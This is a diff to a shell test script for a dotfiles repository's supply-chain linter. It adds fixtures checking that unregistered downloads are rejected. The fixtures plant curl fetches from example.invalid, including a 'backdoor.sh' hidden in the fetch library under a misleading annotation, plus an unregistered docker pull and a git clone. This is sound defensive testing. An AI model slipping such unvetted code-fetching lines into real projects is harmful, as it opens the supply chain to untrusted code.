@@ -18,13 +18,35 @@ python3 "$repo_root/scripts/validate-network-sources.py"
 python3 "$repo_root/scripts/render-supply-chain.py" --check
 printf 'PASS: the network-source registry validates and its inventory is current\n'
 
+# --- Every plan_add step is read, or the build fails ------------------------
+
+python3 "$repo_root/scripts/validate-plan-network.py"
+printf 'PASS: every resolved plan step declares the scripts it runs\n'
+
+# The declaration is what `preflight_plan_network` derives its probe set from,
+# so a `plan_add` line the tokeniser cannot read drops out of the check in both
+# directions and an undeclared network step passes. A trailing comment is valid
+# shell that the runtime `[[ $# -eq 8 ]]` check still accepts, so it is the
+# cheapest proof that the validator fails closed rather than skipping the line.
+plan_tree="$test_root/plan-tree"
+mkdir -p "$plan_tree"
+tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
+  tar -C "$plan_tree" -xf -
+sed -i '/plan_add ai /s/$/  # keep in step order/' \
+  "$plan_tree/platforms/fedora/install.sh"
+run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$plan_tree"
+assert_failure
+assert_contains "$TEST_OUTPUT" 'cannot read this plan_add line as a command'
+assert_contains "$TEST_OUTPUT" 'platforms/fedora/install.sh:'
+printf 'PASS: a plan_add line the tokeniser cannot read is a build error\n'
+
 # Everything the audit named as a trust source is actually registered.
 for source_id in terra-repo terra-signing-key rpmfusion-free-release \
   rpmfusion-nonfree-release tailscale-repo mise-installer starship-installer \
   homebrew-installer homebrew-formulae scoop-installer catppuccin-tmux \
   catppuccin-kde firstmate-repo treehouse-installer no-mistakes-installer \
   npm-registry opam-repository lazyvim-plugins mason-registry \
-  validation-image-fedora; do
+  mason-registry-crashdummyy validation-image-fedora; do
   awk -F '\t' -v want="$source_id" \
     'NR > 1 && $1 == want { found = 1 } END { exit !found }' \
     "$repo_root/config/network-sources.tsv" || {
@@ -109,6 +131,57 @@ rm -f -- "$fixture_repo/scripts/unregistered-image.sh"
 git -C "$fixture_repo" add -A
 printf 'PASS: an unregistered container image fails the linter\n'
 
+# Docker Hub shorthand pulls exactly as much code as the registry-qualified
+# form, so leaving the registry out must not leave the gate behind.
+cat >"$fixture_repo/scripts/unregistered-shorthand-image.sh" <<'EOF'
+#!/usr/bin/env bash
+docker pull nonesuch/nonesuch:latest
+docker run --rm nonesuch/nonesuch:latest true
+EOF
+git -C "$fixture_repo" add -A
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered Docker Hub shorthand image.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered container-image network source'
+rm -f -- "$fixture_repo/scripts/unregistered-shorthand-image.sh"
+git -C "$fixture_repo" add -A
+printf 'PASS: an unregistered Docker Hub shorthand image fails the linter\n'
+
+# ... and `owner/name:tag` outside a container context is ordinary text. A
+# desktop association reads exactly like an image reference, and flagging one
+# would make the linter noise people learn to ignore.
+cat >"$fixture_repo/scripts/mentions-associations.sh" <<'EOF'
+#!/usr/bin/env bash
+associations=("image/jpeg:org.kde.gwenview.desktop" "video/mp4:mpv.desktop")
+printf '%s\n' "${associations[@]}"
+EOF
+git -C "$fixture_repo" add -A
+lint_fixture >/dev/null
+rm -f -- "$fixture_repo/scripts/mentions-associations.sh"
+git -C "$fixture_repo" add -A
+printf 'PASS: an image-shaped string outside a container context needs no annotation\n'
+
+# A clone spelled as an argument vector is the same clone: this is how Lua,
+# Python and PowerShell spawn git, and how the Neovim bootstrap does.
+cat >"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua" <<'EOF'
+return {
+  setup = function()
+    vim.fn.system({ "git", "clone", "https://example.invalid/thing.git", "/tmp/thing" })
+  end,
+}
+EOF
+git -C "$fixture_repo" add -A
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an argv-form clone in a Lua file.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'lua/plugins/unregistered.lua:3'
+assert_contains "$lint_output" 'unregistered git-remote network source'
+rm -f -- "$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua"
+git -C "$fixture_repo" add -A
+printf 'PASS: an argv-form git clone in a Lua file fails the linter\n'
+
 # A presence check or a package-list entry is not an invocation and must not
 # require an annotation, or the linter becomes noise people learn to ignore.
 cat >"$fixture_repo/scripts/mentions-curl.sh" <<'EOF'
@@ -125,8 +198,13 @@ printf 'PASS: naming curl without invoking it needs no annotation\n'
 
 # Files are selected by what they are, not only by their suffix: an
 # extensionless public entry point, a stowed command the role inventory
-# classifies, and an asset known only by its shebang are all scanned.
-for scanned_file in doctor bin/.local/bin/theme platforms/fedora/assets/dotfiles-sway; do
+# classifies, and an asset known only by its shebang are all scanned. Editor
+# configuration and a package manifest download as much as an installer does,
+# and the library that performs every transfer is held to the rule it exists
+# to serve rather than exempted from it.
+for scanned_file in doctor bin/.local/bin/theme platforms/fedora/assets/dotfiles-sway \
+  nvim-lazyvim/.config/nvim/lua/plugins/mason.lua platforms/macos/Brewfile \
+  common/lib/fetch.sh; do
   printf 'curl -fsSL https://example.invalid/x.sh --output /tmp/x\n' \
     >>"$fixture_repo/$scanned_file"
   if lint_output="$(lint_fixture)"; then
@@ -159,11 +237,63 @@ assert_contains "$lint_output" 'unregistered rpm-key-import network source'
 git -C "$fixture_repo" checkout -q -- "$trust_root_installer"
 printf 'PASS: an unregistered DNF repository or RPM signing key fails the linter\n'
 
+# An annotation covers the host it names, not whatever construct happens to
+# follow it. A download placed under an unrelated one inherits nothing.
+cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
+#!/usr/bin/env bash
+# network-source: homebrew-installer
+curl --fail --silent https://example.invalid/install.sh --output /tmp/x
+EOF
+git -C "$fixture_repo" add -A
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter let an annotation for one host cover another.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'downloads from example.invalid'
+assert_contains "$lint_output" 'homebrew-installer'
+
+# The same annotation over the host it really names is accepted, so the case
+# above fails for the host and not merely for being strict.
+cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
+#!/usr/bin/env bash
+# network-source: homebrew-installer
+curl --fail --silent \
+  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh \
+  --output /tmp/x
+EOF
+git -C "$fixture_repo" add -A
+lint_fixture >/dev/null
+rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
+git -C "$fixture_repo" add -A
+printf 'PASS: an annotation satisfies only a download from the host it names\n'
+
+# `caller-provided` says the URL comes from the call site. It cannot launder a
+# host written into the transfer library itself.
+cat >>"$fixture_repo/common/lib/fetch.sh" <<'EOF'
+
+# network-source: caller-provided
+curl --fail --silent https://example.invalid/backdoor.sh --output /tmp/x
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted a hardcoded URL under caller-provided.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'common/lib/fetch.sh:'
+assert_contains "$lint_output" 'downloads from example.invalid'
+git -C "$fixture_repo" checkout -q -- common/lib/fetch.sh
+lint_fixture >/dev/null
+printf 'PASS: caller-provided does not cover a URL hardcoded in the fetch library\n'
+
 # The real call sites are flagged as well: only their annotation passes them.
+# The annotation is matched without its comment marker, so a Lua `--` comment
+# is deleted like a `#` one.
 for annotated in platforms/fedora/lib/tailscale.sh:tailscale-repo:dnf-addrepo \
-  platforms/fedora/lib/fedora.sh:terra-signing-key:rpm-key-import; do
+  platforms/fedora/lib/fedora.sh:terra-signing-key:rpm-key-import \
+  common/lib/fetch.sh:caller-provided:curl \
+  nvim-lazyvim/.config/nvim/lua/config/lazy.lua:lazy-nvim:git-remote \
+  .github/workflows/real-install.yml:parrot-boundary-image:container-image; do
   IFS=: read -r annotated_file annotated_id annotated_label <<<"$annotated"
-  sed -i "/# network-source: $annotated_id\$/d" "$fixture_repo/$annotated_file"
+  sed -i "/network-source: $annotated_id\$/d" "$fixture_repo/$annotated_file"
   if lint_output="$(lint_fixture)"; then
     printf 'The linter accepted %s without its annotation.\n' \
       "$annotated_file" >&2
